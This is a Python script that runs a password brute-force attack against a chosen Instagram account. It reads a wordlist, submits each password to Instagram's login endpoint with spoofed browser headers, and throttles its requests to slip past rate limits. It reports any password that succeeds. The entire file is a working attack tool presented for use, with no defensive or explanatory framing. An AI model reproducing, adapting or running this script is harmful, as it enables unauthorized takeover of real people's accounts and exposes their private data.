import requests
import time
import sys
from datetime import datetime

def instagram_login(username, password):
    session = requests.Session()
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    
    # Use the current timestamp
    timestamp = int(datetime.now().timestamp())
    
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": 'missing'
    }

    try:
        # Send POST request
        login_response = session.post(login_url, data=payload, headers=headers)
        login_response.raise_for_status()  # Raise an error for bad responses

        response_data = login_response.json()
        if response_data.get('authenticated', False):
            print(f"[+] Login successful for {username}:{password}")
            return True
        else:
            print(f"[-] Login failed for {username}:{password}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

def main():
    username = input("Enter Instagram username to bruteforce: ")
    password_file = "passwords.txt"

    try:
        with open(password_file, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Error: {password_file} not found.")
        sys.exit(1)

    print(f"[*] Starting bruteforce attack on {username}")
    print(f"[*] Loaded {len(passwords)} passwords from {password_file}")

    for password in passwords:
        try:
            if instagram_login(username, password):
                print(f"[+] Password found: {password}")
                break
            time.sleep(5)  # Add a delay to avoid rate limiting
        except requests.exceptions.RequestException as e:
            print(f"[-] Network error occurred: {e}")
            time.sleep(30)  # Wait for 30 seconds before retrying
        except KeyboardInterrupt:
            print("\n[!] Bruteforce attack interrupted by user.")
            sys.exit(0)
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}")
            time.sleep(10)  # Wait for 10 seconds before continuing

    print("[*] Bruteforce attack completed.")

if __name__ == "__main__":
    main()
